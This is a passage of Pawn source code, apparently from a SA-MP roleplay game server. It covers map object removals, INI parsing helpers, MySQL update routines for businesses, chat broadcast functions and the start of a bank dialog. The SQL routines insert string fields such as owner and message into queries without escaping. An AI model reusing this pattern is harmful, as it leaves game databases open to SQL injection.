RemoveBuildingForPlayer(playerid, 13722, 1413.4141, -804.7422, 83.4375, 0.25);
RemoveBuildingForPlayer(playerid, 13831, 1413.4141, -804.7422, 83.4375, 0.25);
/*----------------------------------------------------------[New CarDealerShop]
	RemoveBuildingForPlayer(playerid, 5967, 1259.437, -1246.812, 17.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1388, 1238.375, -1258.281, 57.203, 0.250);
	RemoveBuildingForPlayer(playerid, 1391, 1238.375, -1258.273, 44.664, 0.250);
	RemoveBuildingForPlayer(playerid, 1283, 1269.546, -1280.320, 15.710, 0.250);
	RemoveBuildingForPlayer(playerid, 1294, 1254.687, -1276.164, 17.078, 0.250);
	RemoveBuildingForPlayer(playerid, 5857, 1259.437, -1246.812, 17.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1219, 1284.179, -1239.640, 12.914, 0.250);
//----------------------------------------------------------[New CarDealerShop]
//----------------------------------------------------------[Yani CityHall]
	RemoveBuildingForPlayer(playerid, 620, 1809.770, -1846.709, 10.804, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1794.119, -1846.709, 10.804, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1778.479, -1846.709, 10.804, 0.250);
	RemoveBuildingForPlayer(playerid, 620, 1762.829, -1846.709, 10.804, 0.250);
	RemoveBuildingForPlayer(playerid, 5033, 1745.2031, -1882.8516, 26.1406, 0.25);
	RemoveBuildingForPlayer(playerid, 5055, 1745.2031, -1882.8516, 26.1406, 0.25);
//----------------------------------------------------------[Yani CityHall]
//----------------------------------------------------------[Park Vasate CityHall]
	RemoveBuildingForPlayer(playerid, 4057, 1479.5547, -1693.1406, 19.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 4210, 1479.5625, -1631.4531, 12.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1457.9375, -1620.6953, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 713, 1496.8672, -1707.8203, 13.4063, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1713.5078, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1716.7031, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1713.7031, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1289, 1504.7500, -1711.8828, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1704.7656, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1445.0078, -1692.2344, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1445.8125, -1650.0234, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1457.7266, -1710.0625, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1461.6563, -1707.6875, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1704.6406, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1701.5703, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1702.5313, 15.6250, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1457.5547, -1697.2891, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1694.0469, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1692.3906, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 4186, 1479.5547, -1693.1406, 19.5781, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1461.1250, -1687.5625, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1463.0625, -1690.6484, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1458.6172, -1684.1328, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1457.2734, -1666.2969, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1468.9844, -1682.7188, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1471.4063, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1682.3125, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1458.2578, -1659.2578, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1449.8516, -1655.9375, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1477.9375, -1652.7266, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1479.6094, -1653.2500, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1457.3516, -1650.5703, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1454.4219, -1642.4922, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1467.8516, -1646.5938, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1472.8984, -1651.5078, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1465.9375, -1639.8203, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1231, 1466.4688, -1637.9609, 15.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1449.5938, -1635.0469, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1467.7109, -1632.8906, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8906, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1472.6641, -1627.8828, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1479.4688, -1626.0234, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 3985, 1479.5625, -1631.4531, 12.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 4206, 1479.5547, -1639.6094, 13.6484, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1465.8359, -1608.3750, 15.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1471.3516, -1596.7031, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1704.5938, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 700, 1494.2109, -1694.4375, 13.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1693.7344, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1496.9766, -1686.8516, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 641, 1494.1406, -1689.2344, 11.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1488.7656, -1682.6719, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1480.6094, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1488.2266, -1666.1797, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1486.4063, -1651.3906, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1491.3672, -1646.3828, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1493.1328, -1639.4531, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1486.1797, -1627.7656, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1280, 1491.2188, -1632.6797, 13.4531, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.4141, -1629.9766, 15.5313, 0.25);
	RemoveBuildingForPlayer(playerid, 1232, 1494.3594, -1608.3750, 15.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 1226, 1488.5313, -1596.7031, 16.4219, 0.25);
	RemoveBuildingForPlayer(playerid, 1288, 1504.7500, -1705.4063, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1287, 1504.7500, -1704.4688, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1286, 1504.7500, -1695.0547, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 1285, 1504.7500, -1694.0391, 13.5938, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1498.9609, -1684.6094, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1504.1641, -1662.0156, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1504.7188, -1670.9219, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 620, 1503.1875, -1621.1250, 11.8359, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1501.2813, -1624.5781, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 673, 1498.3594, -1616.9688, 12.3984, 0.25);
	RemoveBuildingForPlayer(playerid, 712, 1508.4453, -1668.7422, 22.2578, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1505.6953, -1654.8359, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1508.5156, -1647.8594, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 625, 1513.2734, -1642.4922, 13.6953, 0.25);
	RemoveBuildingForPlayer(playerid, 1258, 1510.8906, -1607.3125, 13.6953, 0.25);
//----------------------------------------------------------[Park Vasate CityHall]*/
    RemoveBuildingForPlayer(playerid, 1302, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1209, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 955, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 956, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1775, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1776, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 1977, 0.0, 0.0, 0.0, 6000.0);
    RemoveBuildingForPlayer(playerid, 3593, 2377.4141, -1427.9922, 23.6875, 0.25);
    RemoveBuildingForPlayer(playerid, 3593, 2407.3125, -1418.3594, 23.6875, 0.25);
    RemoveBuildingForPlayer(playerid, 8229, 1142.0313, 1362.5000, 12.4844, 0.25);
    RemoveBuildingForPlayer(playerid, 1411, 347.1953, 1799.2656, 18.7578, 0.25);
    RemoveBuildingForPlayer(playerid, 1411, 342.9375, 1796.2891, 18.7578, 0.25);
    RemoveBuildingForPlayer(playerid, 16670, 330.7891, 1813.2188, 17.8281, 0.25);
    RemoveBuildingForPlayer(playerid, 3280, 245.3750, 1862.3672, 20.1328, 0.25);
    RemoveBuildingForPlayer(playerid, 3280, 246.6172, 1863.3750, 20.1328, 0.25);
    RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);
    RemoveBuildingForPlayer(playerid, 16671, 193.9531, 2051.7969, 20.1797, 0.25);
    RemoveBuildingForPlayer(playerid, 16668, 357.9375, 2049.4219, 16.8438, 0.25);
    RemoveBuildingForPlayer(playerid, 16669, 380.2578, 1914.9609, 17.4297, 0.25);
    //hq taxi
    RemoveBuildingForPlayer(playerid, 1251, 997.0469, 1710.9531, 11.2656, 0.25);
    RemoveBuildingForPlayer(playerid, 1251, 998.0938, 1755.6875, 11.2656, 0.25);
    RemoveBuildingForPlayer(playerid, 14779, 762.8672, 5.3672, 1001.7344, 0.25);
    /*----------------------------------------------------------------------------*/
    RemoveBuildingForPlayer(playerid, 4003, 1481.0781, -1747.0313, 33.5234, 0.25);
    RemoveBuildingForPlayer(playerid, 4192, 1591.6953, -1674.8516, 20.4922, 0.25);
    //--------------------------=[trucker va farmer job chizaie lazem[====================================
    RemoveBuildingForPlayer(playerid, 17350, -54.9922, -1130.7266, 4.5781, 0.25);
    RemoveBuildingForPlayer(playerid, 3425, -370.3750, -1446.9688, 35.9531, 0.25);
    RemoveBuildingForPlayer(playerid, 17298, -366.6719, -1422.6875, 30.3750, 0.25);
    RemoveBuildingForPlayer(playerid, 1454, -372.1797, -1434.6094, 25.5156, 0.25);
    RemoveBuildingForPlayer(playerid, 1454, -369.1953, -1434.6094, 25.5156, 0.25);
    RemoveBuildingForPlayer(playerid, 1454, -366.2031, -1434.6094, 25.4375, 0.25);
    RemoveBuildingForPlayer(playerid, 3276, -361.8125, -1407.5391, 25.4766, 0.25);
    RemoveBuildingForPlayer(playerid, 1454, -363.2109, -1434.6094, 25.3984, 0.25);
    RemoveBuildingForPlayer(playerid, 1438, -87.0547, -1132.6797, 0.0469, 0.25);
    RemoveBuildingForPlayer(playerid, 17072, -54.9922, -1130.7266, 4.5781, 0.25);
    RemoveBuildingForPlayer(playerid, 17073, -56.1250, -1130.1719, 4.4922, 0.25);
    RemoveBuildingForPlayer(playerid, 1462, -60.3594, -1116.9375, 0.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 1438, -63.6719, -1125.6953, 0.0469, 0.25);
    RemoveBuildingForPlayer(playerid, 1438, -63.4141, -1115.4141, 0.0469, 0.25);
    RemoveBuildingForPlayer(playerid, 3573, 1798.6484, -2057.9141, 14.9844, 0.25);
    RemoveBuildingForPlayer(playerid, 1462, -79.2500, -1137.7188, 0.0547, 0.25);
    RemoveBuildingForPlayer(playerid, 1415, -68.3516, -1104.9922, 0.2188, 0.25);
    RemoveBuildingForPlayer(playerid, 1415, -63.8125, -1106.4219, 0.2188, 0.25);
    RemoveBuildingForPlayer(playerid, 790, -448.0938, -1442.9531, 23.2422, 0.25);
    RemoveBuildingForPlayer(playerid, 735, -461.9766, -1459.5703, 15.1172, 0.25);
    RemoveBuildingForPlayer(playerid, 790, -425.9531, -1432.7813, 25.0547, 0.25);
    RemoveBuildingForPlayer(playerid, 735, -420.5547, -1459.5703, 21.2578, 0.25);
    RemoveBuildingForPlayer(playerid, 17000, -406.9141, -1448.9688, 24.6406, 0.25);
    RemoveBuildingForPlayer(playerid, 790, -396.6484, -1482.0078, 29.6484, 0.25);
    RemoveBuildingForPlayer(playerid, 790, -396.6484, -1482.0078, 29.6484, 0.25);
    RemoveBuildingForPlayer(playerid, 691, -1023.8047, -1171.0938, 128.5859, 0.25);
    RemoveBuildingForPlayer(playerid, 705, -1022.8750, -1153.4453, 128.2734, 0.25);
    RemoveBuildingForPlayer(playerid, 985, 2497.4063, 2777.0703, 11.5313, 0.25);
    RemoveBuildingForPlayer(playerid, 986, 2497.4063, 2769.1094, 11.5313, 0.25);
    // OOn ke Mahdi Goft
	RemoveBuildingForPlayer(playerid, 3874, -2081.9063, -859.9453, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3874, -2081.9063, -808.7188, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3874, -2081.9063, -757.4844, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3874, -2081.9063, -911.1797, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3874, -2081.9063, -962.4141, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3873, -2081.9063, -911.1797, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3873, -2081.9063, -962.4141, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3873, -2081.9063, -859.9453, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3873, -2081.9063, -808.7188, 48.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 3873, -2081.9063, -757.4844, 48.5234, 0.25);
	// Sprays
	RemoveBuildingForPlayer(playerid, 5422, 2071.4766, -1831.4219, 14.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 5856, 1024.9844, -1029.3516, 33.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 6400, 488.2813, -1734.6953, 12.3906, 0.25);
	RemoveBuildingForPlayer(playerid, 11319, -1904.5313, 277.8984, 42.9531, 0.25);
	RemoveBuildingForPlayer(playerid, 9625, -2425.7266, 1027.9922, 52.2813, 0.25);
	RemoveBuildingForPlayer(playerid, 13028, 720.0156, -462.5234, 16.8594, 0.25);
    // Los Santos Barf Oomade
    //======================================================================
	TextDrawHideForPlayer(playerid,TD_pConnectUp[playerid]);
	TextDrawHideForPlayer(playerid,TD_ConnectUp[1]);
	KillTimer(TimerTD[playerid]);
	TextDrawHideForPlayer(playerid,TD_ConnectUp[2]);
  TextDrawHideForPlayer(playerid,shacklog[playerid]);
	return 1;
}
stock ini_GetKey( line[] )
{
    new keyRes[256];
    keyRes[0] = 0;
    if ( strfind( line , "=" , true ) == -1 ) return keyRes;
    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}

stock ini_GetValue( line[] )
{
    new valRes[256];
    valRes[0]=0;
    if ( strfind( line , "=" , true ) == -1 ) return valRes;
    strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
    return valRes;
}
forward OnBizUpdate(bizid);
forward OnSbizUpdate(sbizid);

public OnBizUpdate(bizid)
{
new query[256];
format(query,256,"UPDATE `bizzes` SET bOwned='%d' WHERE `id`='%d'",BizzInfo[bizid][bOwned],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bOwner='%s' WHERE `id`='%d'",BizzInfo[bizid][bOwner],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bMessage='%s' WHERE `id`='%d'",BizzInfo[bizid][bMessage],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bEntranceX='%.4f' WHERE `id`='%d'",BizzInfo[bizid][bEntranceX],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bEntranceY='%.4f' WHERE `id`='%d'",BizzInfo[bizid][bEntranceY],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bEntranceZ='%.4f' WHERE `id`='%d'",BizzInfo[bizid][bEntranceZ],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bExitX='%.4f' WHERE `id`='%d'",BizzInfo[bizid][bExitX],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bExitY='%.4f' WHERE `id`='%d'",BizzInfo[bizid][bExitY],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bExitZ='%.4f' WHERE `id`='%d'",BizzInfo[bizid][bExitZ],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bLevelNeeded='%d' WHERE `id`='%d'",BizzInfo[bizid][bLevelNeeded],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bBuyPrice='%d' WHERE `id`='%d'",BizzInfo[bizid][bBuyPrice],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bEntranceCost='%d' WHERE `id`='%d'",BizzInfo[bizid][bEntranceCost],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bTill='%d' WHERE `id`='%d'",BizzInfo[bizid][bTill],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bLocked='%d' WHERE `id`='%d'",BizzInfo[bizid][bLocked],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bInterior='%d' WHERE `id`='%d'",BizzInfo[bizid][bInterior],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bProducts='%d' WHERE `id`='%d'",BizzInfo[bizid][bProducts],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bMaxProducts='%d' WHERE `id`='%d'",BizzInfo[bizid][bMaxProducts],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bPriceProd='%d' WHERE `id`='%d'",BizzInfo[bizid][bPriceProd],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bVW='%d' WHERE `id`='%d'",BizzInfo[bizid][bVW],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `bizzes` SET bForosh='%d' WHERE `id`='%d'",BizzInfo[bizid][bForosh],bizid);
mysql_function_query(handle,query,false,"SendQuery","");
return 1;
}
public OnSbizUpdate(sbizid)
{
new query[256];
format(query,256,"UPDATE `specialbizzes` SET sbOwned='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbOwned],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbOwner='%s' WHERE `id`='%d'",SBizzInfo[sbizid][sbOwner],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbMessage='%s' WHERE `id`='%d'",SBizzInfo[sbizid][sbMessage],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbEntranceX='%.4f' WHERE `id`='%d'",SBizzInfo[sbizid][sbEntranceX],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbEntranceY='%.4f' WHERE `id`='%d'",SBizzInfo[sbizid][sbEntranceY],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbEntranceZ='%.4f' WHERE `id`='%d'",SBizzInfo[sbizid][sbEntranceZ],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbLevelNeeded='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbLevelNeeded],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbBuyPrice='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbBuyPrice],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbEntranceCost='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbEntranceCost],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbTill='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbTill],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbProducts='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbProducts],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbMaxProducts='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbMaxProducts],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbPriceProd='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbPriceProd],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `specialbizzes` SET sbForosh='%d' WHERE `id`='%d'",SBizzInfo[sbizid][sbForosh],sbizid);
mysql_function_query(handle,query,false,"SendQuery","");
return 1;
}

public BroadCast(color,const string[])
{
    SendClientMessageToAll(color, string);
    return 1;
}

public ABroadCast(color,const string[],level)
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if (PlayerInfo[i][pAdmin] >= level)
            {
                SendClientMessage(i, color, string);
                printf("%s", string);
            }
        }
    }
    return 1;
}

public OOCOff(color,const string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(!gOoc[i])
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}

public OOCNews(color,const string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(!gNews[i])
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendTeamMessage(team, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(gTeam[i] == team)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}

public SendRadioMessage(member, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pMember] == member || PlayerInfo[i][pLeader] == member)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendJobMessage(job, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pJob] == job)
            {
            if(JobDuty[i] == 1)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
    }
}
/**
public SendClanMessage(clan, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pClan] == 1)
            {
                if(!gFam[i])
                {
                    SendClientMessage(i, color, string);
                }
        }
            if(PlayerInfo[i][pClan] == 2)
            {
                if(!gFam[i])
                {
                    SendClientMessage(i, color, string);
                }
        }
    }
    }
}*/
public SendFamilyMessage(family, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pMember] == family || PlayerInfo[i][pLeader] == family)
            {
                if(!gFam[i])
                {
                    SendClientMessage(i, color, string);
                }
        }
    }
    }
}
public SendClanMessage(clan, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pClan] == clan)
            {
                if(!gFam[i])
                {
                    SendClientMessage(i, color, string);
                }
        }
    }
    }
}
forward SendWalkieMessage(freqs[], color, string[]);
public SendWalkieMessage(freqs[], color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(!strcmp(PlayerSetFreq[i],freqs,true))
            {
                SCM(i, color, string);
            }
        }
    }
}
//----------------------------------------------------------
public SendTeamBeepMessage(team, color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(gTeam[i] == team)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendLeaderMessage(color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pLeader] >= 1)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendLeadermMessage(color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pLeader] == 5)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pLeader] == 6)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pLeader] == 12)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pLeader] == 13)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pLeader] == 14)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pLeader] == 15)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pLeader] == 17)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendMemberMessage(color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pMember] == 5)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pMember] == 6)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pMember] == 12)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pMember] == 13)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pMember] == 14)
            {
                SendClientMessage(i, color, string);
            }
            if(PlayerInfo[i][pMember] == 15)
            {
                SendClientMessage(i, color, string);
            }
                if(PlayerInfo[i][pMember] == 17)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendAdminMessage(color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pAdmin] >= 1)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public SendAdminMessageg(color, string[])
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pAdmin] >= 7)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}
public PlayerPlayMusic(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        SetTimer("StopMusic", 5000, 0);
        PlayerPlaySound(playerid, 1068, 0.0, 0.0, 0.0);
    }
}

public StopMusic()
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
            PlayerFixRadio(i);
        }
    }
}
public PlayerFixRadio(playerid)
{
    if(IsPlayerConnected(playerid) && CarRadioPlayed[playerid] == false)
    {
        SetTimer("PlayerFixRadio2", 1000, 0);
        Fixr[playerid] = 1;
    }
}

public PlayerFixRadio2()
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(Fixr[i])
            {
                PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
                Fixr[i] = 0;
            }
        }
    }
}

//=====DIALOGS==================================================================
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	new bnstring[1024];
     if(dialogid == DIALOG_BANK_LIST)
    {
        if(response)
        {
            if(listitem == 0)
            {
                ShowPlayerDialog(playerid,DIALOG_BANK_WITHDRAW,DIALOG_STYLE_INPUT,"Withdraw","Meghdar mpney'e(Pool) Ra Vared Konid!","Ok","Cancel");
                return 1;
            }
            if(listitem == 1)
            {
                  ShowPlayerDialog(playerid,DIALOG_BANK_DEPOSIT,DIALOG_STYLE_INPUT,"Money","Meghdar money'e(Pool) Morede Nazar Khod Ra Vared Konid.","Ok","Cancel");
                return 1;
            }
            if(listitem == 2)
            {
